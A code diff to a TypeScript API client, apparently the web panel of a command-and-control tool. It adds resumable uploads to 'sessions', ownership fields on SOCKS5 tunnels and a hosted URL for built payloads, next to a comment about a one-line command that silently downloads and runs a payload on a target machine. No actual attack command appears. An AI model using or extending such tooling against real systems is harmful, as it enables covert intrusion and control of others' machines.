@@ -81,6 +81,9 @@ export const sessionApi = {
     done: boolean
   }) =>
     api.post(`/sessions/${id}/files/upload`, payload),
+  /** 断点续传（v1.4.3 #15a-B）：查询该 upload_id 已收到多少字节，从那里接着传 */
+  getUploadStatus: (id: string, uploadId: string) =>
+    api.get(`/sessions/${id}/files/upload/${encodeURIComponent(uploadId)}`),
   listProcesses: (id: string) => 
     api.get(`/sessions/${id}/processes`),
   killProcess: (id: string, pid: number) => 
@@ -541,6 +544,15 @@ export interface SOCKS5ServerInfo {
   updated_at?: string
   protocol?: string
   mode?: string
+  // ── v1.4.3 #16 追加：隧道归属会话（会话多了直接看主机名，不用逐个点开对 id）──
+  /** 归属会话的主机名（会话管理器里查不到时为空） */
+  session_host?: string
+  /** 归属会话的用户名 */
+  session_user?: string
+  /** 归属会话的判活状态：active / asleep（老服务端没有该字段） */
+  session_status?: string
+  /** 归属会话当前是否在线 */
+  session_alive?: boolean
 }
 
 export interface Plugin {
@@ -691,6 +703,11 @@ export interface BuildResponse {
   sha256: string
   build_time: string
   download_url: string
+  /**
+   * 载荷托管地址（v1.4.3 #15b-B）：走**监听器端口**的 `/<prefix>/<token>/<文件名>`，
+   * 不含 `/api/v1`、不暴露面板端口，永久可重复下载。为空表示未启用托管。
+   */
+  hosted_url?: string
   /** 一条命令上线：复制到目标机执行即可静默下载并运行载荷（exe/raw 生效） */
   one_liner?: string
   /** 一条命令上线实际使用的下载主机（host[:port]），由服务端解析 */
